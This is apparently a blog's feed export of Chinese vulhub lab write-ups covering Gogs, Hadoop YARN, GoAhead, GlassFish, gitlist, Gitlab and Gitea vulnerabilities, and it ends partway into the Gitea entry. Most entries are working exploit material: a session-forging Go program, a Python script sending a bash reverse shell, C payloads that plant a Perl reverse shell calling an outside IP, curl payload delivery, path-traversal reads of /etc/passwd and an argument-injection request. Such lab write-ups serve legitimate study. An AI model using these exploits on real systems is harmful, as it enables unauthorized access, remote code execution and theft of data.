    <entry>
      <title>Gogs 任意用户登录漏洞</title>
      <link href="/2019/02/19/gogs-ren-yi-yong-hu-deng-lu-lou-dong/"/>
      <url>/2019/02/19/gogs-ren-yi-yong-hu-deng-lu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Gogs-任意用户登录漏洞（CVE-2018-18925）"><a href="#Gogs-任意用户登录漏洞（CVE-2018-18925）" class="headerlink" title="Gogs 任意用户登录漏洞（CVE-2018-18925）"></a>Gogs 任意用户登录漏洞（CVE-2018-18925）</h1><p>gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</p><p>其0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用Gob序列化生成session文件：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"bytes"</span>    <span class="token string">"encoding/gob"</span>    <span class="token string">"encoding/hex"</span>    <span class="token string">"fmt"</span>    <span class="token string">"io/ioutil"</span>    <span class="token string">"os"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">EncodeGob</span><span class="token punctuation">(</span>obj <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> obj <span class="token punctuation">{</span>        gob<span class="token punctuation">.</span><span class="token function">Register</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    buf <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span>    err <span class="token operator">:=</span> gob<span class="token punctuation">.</span><span class="token function">NewEncoder</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">return</span> buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> err<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> uid <span class="token builtin">int64</span> <span class="token operator">=</span> <span class="token number">1</span>    obj <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">"_old_uid"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">:</span> uid<span class="token punctuation">,</span> <span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"root"</span><span class="token punctuation">}</span>    data<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">EncodeGob</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    err <span class="token operator">=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    edata <span class="token operator">:=</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>edata<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>然后注册一个普通用户账户，创建项目，并在“版本发布”页面上传刚生成的session文件：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190619134954.png-water_print" alt=""></p><p>通过这个附件的URL，得知这个文件的文件名：<code>.attachments/f907bf23-08e4-4178-bef7-733499509271</code>。</p><p>然后，构造<code>Cookie：i_like_gogits=../attachments/2/e/f907bf23-08e4-4178-bef7-733499509271</code>，访问即可发现已经成功登录id=1的用户（即管理员）：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190619135005.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Gogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop YARN ResourceManager 未授权访问</title>
      <link href="/2019/02/19/hadoop-yarn-resourcemanager-wei-shou-quan-fang-wen/"/>
      <url>/2019/02/19/hadoop-yarn-resourcemanager-wei-shou-quan-fang-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="Hadoop-YARN-ResourceManager-未授权访问"><a href="#Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问"></a>Hadoop YARN ResourceManager 未授权访问</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 REST API (<a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html" target="_blank" rel="noopener">https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html</a>) 也可以提交任务执行。</p><p>利用过程如下：</p><ol><li>在本地监听等待反弹 shell 连接</li><li>调用 New Application API 创建 Application</li><li>调用 Submit Application API 提交</li></ol><h2 id="exp-脚本"><a href="#exp-脚本" class="headerlink" title="exp 脚本"></a>exp 脚本</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">import</span> requeststarget <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:8088/'</span>lhost <span class="token operator">=</span> <span class="token string">'192.168.0.1'</span> <span class="token comment" spellcheck="true"># put your local host ip here, and listen at port 9999</span>url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">'ws/v1/cluster/apps/new-application'</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">)</span>app_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'application-id'</span><span class="token punctuation">]</span>url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">'ws/v1/cluster/apps'</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'application-id'</span><span class="token punctuation">:</span> app_id<span class="token punctuation">,</span>    <span class="token string">'application-name'</span><span class="token punctuation">:</span> <span class="token string">'get-shell'</span><span class="token punctuation">,</span>    <span class="token string">'am-container-spec'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">'commands'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">'command'</span><span class="token punctuation">:</span> <span class="token string">'/bin/bash -i >&amp; /dev/tcp/%s/9999 0>&amp;1'</span> <span class="token operator">%</span> lhost<span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">'application-type'</span><span class="token punctuation">:</span> <span class="token string">'YARN'</span><span class="token punctuation">,</span><span class="token punctuation">}</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190619135633.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoAhead 远程命令执行漏洞</title>
      <link href="/2019/02/18/goahead-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/02/18/goahead-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="GoAhead-远程命令执行漏洞（CVE-2017-17562）"><a href="#GoAhead-远程命令执行漏洞（CVE-2017-17562）" class="headerlink" title="GoAhead 远程命令执行漏洞（CVE-2017-17562）"></a>GoAhead 远程命令执行漏洞（CVE-2017-17562）</h1><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序，这个漏洞就出现在运行CGI程序的时候。</p><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了<code>REMOTE_HOST</code>和<code>HTTP_AUTHORIZATION</code>。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，<code>LD_</code>开头的环境变量和动态链接库有关，如<code>LD_PRELOAD</code>中指定的动态链接库，将会被自动加载；<code>LD_LIBRARY_PATH</code>指定的路径，程序会去其中寻找动态链接库。</p><p>我们可以指定<code>LD_PRELOAD=/proc/self/fd/0</code>，因为<code>/proc/self/fd/0</code>是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给<code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</code>，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><pre class=" language-C++"><code class="language-C++">#include <unistd.h>static void before_main(void) __attribute__((constructor));static void before_main(void){    write(1, "Hello: World!\n", 14);}</code></pre><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：<br><code>gcc -shared -fPIC ./payload.c -o payload.so</code></p><p>将payload.so作为post body发送：</p><p><code>curl -X POST --data-binary @payload.so "http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0" -i</code></p><p>可见，<code>Hello: world!</code>已被成功输出，说明我们的动态链接库中的代码已被执行：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190616184027.png-water_print" alt=""></p><p>进一步利用漏洞，在服务器中写入一个perl脚本，直接在浏览器中访问这个脚本，如果按照设定，该脚本会直接被cgi调用执行</p><p>但是我们直接写入的文件在服务器中没有执行权限，我们要额外执行一步，向服务器发送一个数据，增加这个文件的可执行权限。下面是详细步骤：</p><p>使用nc监听本地8989端口,为后面获取shell做准备。我们在操作机中打开命令行输入如下命令 ，监听一个指定端口，此端口可以任意指定，只要不和系统服务冲突即可。</p><p><code>向服务器中写入shell.pl</code>文件</p><p>编辑反弹shell的payload2,这个payload2是在指定路径下写入一个perl脚本，这个脚本内容才是反弹shell的，payload2源代码如下:</p><pre class=" language-C++"><code class="language-C++">#include <unistd.h>#include <stdlib.h>#include <stdio.h>static void before_main(void) __attribute__((constructor));static void before_main(void){  FILE *fp;  int i=0;  char *s="#!/usr/bin/perl\nuse Socket;$i='172.16.11.2';$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}";  fp=fopen("./cgi-bin/shell.pl","wr");  while(*s)  { printf("%c",*s);    fseek(fp,i++,SEEK_SET);    fprintf(fp,"%c",*s++);          }  fclose(fp);  getchar();}</code></pre><p>这段代码是在cgi-bin目录下写入一个新文件shell.pl，这是一个perl反弹shell的脚本，直接反弹shell的c语言代码，因为环境的问题，在本实验中会出现，本文就不再赘述。</p><p>正常情况下在发送这个数据包到服务器，生成文件之后，我们只需要访问一下这个新生成的文件shell.pl，shell即可弹回。</p><p>打开命令行，使用命令对payload2.c交叉编译</p><pre class=" language-bash"><code class="language-bash">gcc -shared -fPIC ./payload2.c -o payload2.so</code></pre><p>现在我们打开命令行，再次使用curl命令，发送payload2.so</p><pre class=" language-bash"><code class="language-bash">curl -X POST --data-binary @payload2.so <span class="token string">"http://IP/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0"</span> -i</code></pre><p>此时文件已经写入服务器中的cgi-bin/目录下了，正常的话我们访问一下<a href="http://IP/cgi-bin/shell.pl,即可获得shell。" target="_blank" rel="noopener">http://IP/cgi-bin/shell.pl,即可获得shell。</a></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190616184058.png-water_print" alt=""></p><p>无法访问是因为这个新创建的文件只是一个只读文件，并没有执行权限，我们接下来要做的就是，修改这个shell.pl的权限。</p><p>给shell.pl文件增加可执行权限</p><p>此时我们只要再发个修改文件权限模式的数据包就行了。我们可以继续编辑一个<code>payload3.c</code>，源代码如下:</p><pre class=" language-C++"><code class="language-C++">#include <unistd.h>#include <stdlib.h>#include <sys/types.h>#include <sys/stat.h>static void before_main(void) __attribute__((constructor));static void before_main(void){chmod("./cgi-bin/shell.pl", S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IWGRP|S_IXGRP|S_IROTH|S_IWOTH|S_IXOTH);}</code></pre><p>这里我们使用的C语言自带的chomd函数来修改，不要使用system函数调用系统命令来修改，当直接在这调用系统命令时，该条命令的执行结果将会无限循环，导致系统出错，这个文件执行之后即执行了<code>chmod 777 shell.pl</code></p><p>我们可以打开命令行，输入以下命令，再次对payload3进行交叉编译</p><pre class=" language-bash"><code class="language-bash">gcc -shared -fPIC ./payload3.c -o payload3.so</code></pre><p>编译完成之后尝试发送payload3.so，继续使用之前的curl命令发送数据：</p><pre class=" language-bash"><code class="language-bash">curl -X POST --data-binary @payload3.so <span class="token string">"http://IP/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0"</span> -i</code></pre><p>这时候我们在访问一下我们写入的shell <code>http://IP/cgi-bin/shell.pl</code>成功反弹</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> GoAhead </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GlassFish 任意文件读取漏洞</title>
      <link href="/2019/02/18/glassfish-ren-yi-wen-jian-du-qu-lou-dong/"/>
      <url>/2019/02/18/glassfish-ren-yi-wen-jian-du-qu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>java语言中会把<code>%c0%ae</code>解析为<code>\uC0AE</code>，最后转义为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://your-ip:8080</code>和<code>http://your-ip:4848</code>即可查看web页面。其中，<code>8080</code>端口是网站内容，<code>4848</code>端口是<code>GlassFish</code>管理中心。</p><p>访问<code>https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code>，发现已成功读取<code>/etc/passwd</code>内容：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190616164957.png-water_print" alt=""></p><h2 id="额外说明"><a href="#额外说明" class="headerlink" title="额外说明"></a>额外说明</h2><p>本环境超级管理员密码在<code>docker-compose.yml</code>中设置，默认为<code>vulhub_default_password</code>，在4848端口利用该密码可以登录管理员账户。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> GlassFish </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitlist 0.6.0 远程命令执行漏洞</title>
      <link href="/2019/02/17/gitlist-0.6.0-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/02/17/gitlist-0.6.0-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="gitlist-0-6-0-远程命令执行漏洞"><a href="#gitlist-0-6-0-远程命令执行漏洞" class="headerlink" title="gitlist 0.6.0 远程命令执行漏洞"></a>gitlist 0.6.0 远程命令执行漏洞</h1><p>gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本中，存在一处命令参数注入问题，可以导致远程命令执行漏洞。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在用户对仓库中代码进行搜索的时候，gitlist将调用<code>git grep</code>命令：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">searchTree</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$branch</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string">"grep -i --line-number {$query} $branch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token punctuation">\</span>RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>其中，<code>$query</code>是搜索的关键字，<code>$branch</code>是搜索的分支。<br>如果用户输入的<code>$query</code>的值是<code>--open-files-in-pager=id;</code>，将可以执行id命令：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615160512.png-water_print" alt=""></p><p>导致这个漏洞的原因，有几点：</p><ol><li>开发者对于escapeshellarg函数的误解，造成参数注入</li><li>git grep的参数–open-files-in-pager的值，将被直接执行<br>理论上，在经过<code>$query = escapeshellarg($query);</code>处理后，<code>$query</code>将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。</li></ol><p>我们可以试一下如下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">grep</span> -i --line-number -e <span class="token string">'--open-files-in-pager=id;'</span> master</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615160525.png-water_print" alt=""></p><p>如上图，我将<code>$query</code>放在了<code>-e</code>参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数<code>--open-files-in-pager</code>。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre class=" language-http"><code class="language-http">POST /example/tree/a/search HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:8080<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<span class="token header-name keyword">Content-Length:</span> 56query=--open-files-in-pager=touch /tmp/success;</code></pre><p>其中，我们访问的是<code>/example/tree/a/search</code>，<code>example</code>是项目名称，需要是目标<code>gitlist</code>上一个已存在的项目；<code>a</code>在正常情况下应该是分支的名称，也就是<code>"grep -i --line-number {$query} $branch"</code>中的<code>$branch</code>，但因为我们的<code>$query</code>被当成了一个参数，所以<code>$branch</code>就应该被当做搜索的关键字。</p><p>如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了<code>“a”</code>这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。</p><p>数据包发送后，用<code>docker-compose exec web bash</code>进入容器中，可见<code>/tmp/success</code>已成功创建：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615160532.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> gitlist </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitlab 任意文件读取漏洞</title>
      <link href="/2019/02/17/gitlab-ren-yi-wen-jian-du-qu-lou-dong/"/>
      <url>/2019/02/17/gitlab-ren-yi-wen-jian-du-qu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Gitlab-任意文件读取漏洞（CVE-2016-9086）"><a href="#Gitlab-任意文件读取漏洞（CVE-2016-9086）" class="headerlink" title="Gitlab 任意文件读取漏洞（CVE-2016-9086）"></a>Gitlab 任意文件读取漏洞（CVE-2016-9086）</h1><p>Gitlab版本：8.13.1<br>原理剖析：<a href="http://paper.seebug.org/104/" target="_blank" rel="noopener">http://paper.seebug.org/104/</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，Web端口为10080，ssh端口为10022。访问<a href="http://your-ip:10080" target="_blank" rel="noopener">http://your-ip:10080</a>，设置管理员（用户名root）密码，登录。<br>新建一个项目，点击<code>GitLab export</code>：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615150955.png-water_print" alt=""></p><p>将<a href="https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2016-9086/test.tar.gz" target="_blank" rel="noopener">test.tar.gz</a>上传，将会读取到/etc/passwd文件内容：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615151006.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitea 1.4.0 目录穿越导致命令执行漏洞</title>
      <link href="/2019/02/17/gitea-1.4.0-mu-lu-chuan-yue-dao-zhi-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/02/17/gitea-1.4.0-mu-lu-chuan-yue-dao-zhi-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h1><p>Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>参考来源：<a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html" target="_blank" rel="noopener">leavesongs</a></p></blockquote><h3 id="漏洞一、-逻辑错误导致权限绕过"><a href="#漏洞一、-逻辑错误导致权限绕过" class="headerlink" title="漏洞一、 逻辑错误导致权限绕过"></a>漏洞一、 逻辑错误导致权限绕过</h3><p>这是本漏洞链的导火索，其出现在Git LFS的处理逻辑中。</p><blockquote><p>Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件储存在git服务器上。gitea作为一个git服务器，也提供了LFS功能。</p></blockquote><p>在 modules/lfs/server.go 文件中，PostHandler是POST请求的处理函数：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190615141142.png-water_print" alt=""></p><p>可见，其中间部分包含对权限的检查：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">if</span> <span class="token operator">!</span><span class="token function">authenticate</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> repository<span class="token punctuation">,</span> rv<span class="token punctuation">.</span>Authorization<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">requireAuth</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>在没有权限的情况下，仅执行了requireAuth函数：这个函数做了两件事，一是写入WWW-Authenticate头，二是设置状态码为401。也就是说，在没有权限的情况下，并没有停止执行PostHandler函数。</p><p>所以，这里存在一处权限绕过漏洞。</p><h3 id="漏洞二、目录穿越漏洞"><a href="#漏洞二、目录穿越漏洞" class="headerlink" title="漏洞二、目录穿越漏洞"></a>漏洞二、目录穿越漏洞</h3><p>这个权限绕过漏洞导致的后果是，未授权的任意用户都可以为某个项目（后面都以vulhub/repo为例）创建一个Git 